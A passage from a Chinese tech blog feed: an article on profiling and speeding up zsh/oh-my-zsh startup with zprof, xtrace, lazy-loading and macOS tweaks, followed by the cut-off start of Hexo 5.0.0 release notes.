zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 <code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 _zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> /Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\"> <div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-08-10</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 